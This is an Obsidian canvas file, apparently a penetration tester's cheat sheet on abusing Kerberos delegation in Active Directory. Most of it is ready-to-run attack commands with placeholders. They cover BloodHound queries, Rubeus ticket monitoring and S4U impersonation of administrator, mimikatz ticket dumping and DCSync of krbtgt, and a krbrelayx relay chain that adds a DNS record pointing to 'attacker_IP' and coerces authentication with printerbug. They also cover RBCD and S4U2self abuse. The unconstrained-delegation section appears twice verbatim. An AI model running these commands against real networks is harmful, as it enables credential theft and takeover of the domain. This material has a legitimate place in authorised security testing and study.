{
	"nodes":[
		{"id":"403b619ce08bb4e3","type":"group","x":-960,"y":-880,"width":5120,"height":7440,"color":"#32a5ff","label":"KERBEROS DELEGATION ABUSE"},
		{"id":"ba1cceffd6a605be","type":"text","text":"# Find delegation\n\n>[!info] Theory\n>- https://www.thehacker.recipes/ad/movement/kerberos/delegations/#theory\n\n\n>[!example] Tools\n>- [impacket's finddelegation.py](https://github.com/fortra/impacket/blob/master/examples/findDelegation.py)\n>- [bloodhound](https://github.com/SpecterOps/BloodHound)\n\n\n```shell\n# Scan for any delegation\nðŸŸ£ findDelegation.py \"<domain>\"/\"<user>\":\"<password>\"\n# bloodhound queries for unconstrained delegation (KUD) on a computer\nðŸ”´ MATCH (c:Computer {unconstraineddelegation:true}) RETURN c\n# bloodhound queries for unconstrained delegation (KUD) on a user\nðŸ”´ MATCH (c:User {unconstraineddelegation:true}) RETURN c\n# bloodhound queries for constrained delegation (KCD) on a computer\nðŸ”´ MATCH p=((c:Base)-[:AllowedToDelegate]->(t:Computer)) RETURN p\n# bloodhound queries for constrained delegation (KCD) on a user\nðŸ”´ MATCH p=shortestPath((u:User)-[*1..]->(c:Computer {name: \"<MYTARGET.FQDN>\"})) RETURN p\n```","x":-440,"y":-560,"width":2160,"height":600},
		{"id":"48320816880211d6","type":"text","text":"# Unconstrained delegation \n\n>[!info] Theory\n>- https://www.thehacker.recipes/ad/movement/kerberos/delegations/#unconstrained-delegations-kud\n\n\n>[!example] Tools\n>- [Rubeus](https://github.com/GhostPack/Rubeus)\n>- [Mimikatz](https://github.com/gentilkiwi/mimkatz)\n\n\n```shell\n# Rubeus as a listener to wait for a user to authenticate, the ST to show up and to extract the TGT it contains\nðŸ”µ Rubeus.exe monitor /interval:5\n# TGT can be used to request a Service Ticket for another service.\nðŸ”µ Rubeus.exe asktgs /ticket:$base64_extracted_TGT /service:$target_SPN /ptt\n\n# Use mimkatz to dump tickets from lsa and reuse them\nðŸ”µ mimikatz privilege::debug sekurlsa::tickets /export sekurlsa::tickets /export\n# Once the TGT is injected, it can natively be used when accessing a service\nðŸ”µ mimikatz privilege::debug lsadump::dcsync /dc:$DomainController /domain:$DOMAIN /user:krbtgt\n\n# 1. Edit the compromised account's SPN via the msDS-AdditionalDnsHostName property (HOST for incoming SMB with PrinterBug, HTTP for incoming HTTP with PrivExchange)\nðŸŸ£ addspn.py -u 'DOMAIN\\CompromisedAccont' -p 'LMhash:NThash' -s 'HOST/attacker.DOMAIN_FQDN' --additional 'DomainController'\n\n# 2. Add a DNS entry for the attacker name set in the SPN added in the target machine account's SPNs\nðŸŸ£ dnstool.py -u 'DOMAIN\\CompromisedAccont' -p 'LMhash:NThash' -r 'attacker.DOMAIN_FQDN' -d 'attacker_IP' --action add 'DomainController'\n\n# 3. Check that the record was added successfully (after ~3 minutes)\nâšª nslookup attacker.DOMAIN_FQDN DomainController\n\n# 4. Start the krbrelayx listener (the tool needs the right kerberos key to decrypt the ticket it will receive)\n# 4.a. either specify the salt and password. krbrelayx will calculate the kerberos keys\nâšª krbrelayx.py --krbsalt 'DOMAINusername' --krbpass 'password'\n# 4.b. or supply the right Kerberos long-term key directly\nâšª krbrelayx.py -aesKey aes256-cts-hmac-sha1-96-VALUE\n\n# 5. Authentication coercion\n# PrinterBug, PetitPotam, PrivExchange, ...\nâšª printerbug.py domain/'vuln_account$'@'DC_IP' -hashes LM:NT 'DomainController'\n\n# 6. Check if it works. Krbrelayx should have received and decrypted a ticket, extracting the coerced principal's TGT.\n# There should be a krbtgt ccache file in the current directory. And it can be used by\nâšª export KRB5CCNAME=`pwd`/'krbtgt.ccache'\n```","x":-440,"y":120,"width":2160,"height":1100},
		{"id":"5738e83a0e3bf07c","type":"text","text":"# Unconstrained delegation \n\n>[!info] Theory\n>- https://www.thehacker.recipes/ad/movement/kerberos/delegations/#unconstrained-delegations-kud\n\n\n>[!example] Tools\n>- [Rubeus](https://github.com/GhostPack/Rubeus)\n>- [Mimikatz](https://github.com/gentilkiwi/mimkatz)\n\n\n```shell\n# Rubeus as a listener to wait for a user to authenticate, the ST to show up and to extract the TGT it contains\nðŸ”µ Rubeus.exe monitor /interval:5\n# TGT can be used to request a Service Ticket for another service.\nðŸ”µ Rubeus.exe asktgs /ticket:$base64_extracted_TGT /service:$target_SPN /ptt\n\n# Use mimkatz to dump tickets from lsa and reuse them\nðŸ”µ mimikatz privilege::debug sekurlsa::tickets /export sekurlsa::tickets /export\n# Once the TGT is injected, it can natively be used when accessing a service\nðŸ”µ mimikatz privilege::debug lsadump::dcsync /dc:$DomainController /domain:$DOMAIN /user:krbtgt\n\n# 1. Edit the compromised account's SPN via the msDS-AdditionalDnsHostName property (HOST for incoming SMB with PrinterBug, HTTP for incoming HTTP with PrivExchange)\nðŸŸ£ addspn.py -u 'DOMAIN\\CompromisedAccont' -p 'LMhash:NThash' -s 'HOST/attacker.DOMAIN_FQDN' --additional 'DomainController'\n\n# 2. Add a DNS entry for the attacker name set in the SPN added in the target machine account's SPNs\nðŸŸ£ dnstool.py -u 'DOMAIN\\CompromisedAccont' -p 'LMhash:NThash' -r 'attacker.DOMAIN_FQDN' -d 'attacker_IP' --action add 'DomainController'\n\n# 3. Check that the record was added successfully (after ~3 minutes)\nâšª nslookup attacker.DOMAIN_FQDN DomainController\n\n# 4. Start the krbrelayx listener (the tool needs the right kerberos key to decrypt the ticket it will receive)\n# 4.a. either specify the salt and password. krbrelayx will calculate the kerberos keys\nâšª krbrelayx.py --krbsalt 'DOMAINusername' --krbpass 'password'\n# 4.b. or supply the right Kerberos long-term key directly\nâšª krbrelayx.py -aesKey aes256-cts-hmac-sha1-96-VALUE\n\n# 5. Authentication coercion\n# PrinterBug, PetitPotam, PrivExchange, ...\nâšª printerbug.py domain/'vuln_account$'@'DC_IP' -hashes LM:NT 'DomainController'\n\n# 6. Check if it works. Krbrelayx should have received and decrypted a ticket, extracting the coerced principal's TGT.\n# There should be a krbtgt ccache file in the current directory. And it can be used by\nâšª export KRB5CCNAME=`pwd`/'krbtgt.ccache'\n```","x":-440,"y":1440,"width":2160,"height":1100},
		{"id":"0fca99ee91fbb45a","type":"text","text":"# Resource-Based Constrained Delegation (RBCD)\n\n>[!info] Theory\n>- https://www.thehacker.recipes/ad/movement/kerberos/delegations/rbcd\n\n\n>[!example] Tools\n>- [Rubeus](https://github.com/GhostPack/Rubeus)\n>- [getTGT](https://github.com/fortra/impacket/blob/master/examples/getTGT.py)\n>- [rbcd.py](https://github.com/fortra/impacket/blob/master/examples/rbcd.py)\n\n\n```shell\n# add computer account\nðŸŸ£ addcomputer.py -computer-name '<computer_name>' -computer-pass '<ComputerPassword>' -dc-host '<dc>' -domain-netbios '<domain_netbios>' '<domain>'/'<user>':'<password>'\n\n# RBCD With added computer account using rubeus\nðŸ”µ Rubeus.exe hash /password:'<computer_pass>' /user:'<computer>' /domain:'<domain>'\nðŸ”µ Rubeus.exe s4u /user:'<fake_computer$>' /aes256:<AES 256 hash> /impersonateuser:administrator /msdsspn:cifs/<victim.domain.local> /altservice:krbtgt,cifs,host,http,winrm,RPCSS,wsman,ldap /domain:domain.local /ptt\n\n# RBCD With added computer account using impacket\nðŸŸ£ rbcd.py -delegate-from '<computer>$' -delegate-to '<target>$' -dc-ip '<dc>' -action 'write' '<domain>'/'<user>':'<password>'\nðŸŸ£ getST.py -spn host/'<dc_fqdn>' '<domain>'/'<computer_account>':'<computer_pass>' -impersonate Administrator --dc-ip '<dc_ip>'\n```","x":-440,"y":2720,"width":2160,"height":640},
		{"id":"00a802658a3e1eb6","type":"text","text":"# S4U2self abuse\n\n>[!info] Theory\n>- https://www.thehacker.recipes/ad/movement/kerberos/delegations/s4u2self-abuse#theory\n\n\n>[!example] Tools\n>- [getTGT](https://github.com/fortra/impacket/blob/master/examples/getTGT.py)\n\n\n```shell\n#  Machine account's TGT\nðŸŸ£ getTGT.py -dc-ip \"<dc_ip>\" -hashes :\"<machine_hash>\" \"<domain>\"/\"<machine>$\"\n\n# Obtain a Service Ticket\nðŸŸ£ getST.py -self -impersonate \"<admin>\" -altservice \"cifs/<machine>\" -k -no-pass -dc-ip \"DomainController\" \"<domain>\"/'<machine>$'\n\n```","x":-440,"y":4160,"width":2160,"height":500}
	],
	"edges":[]
}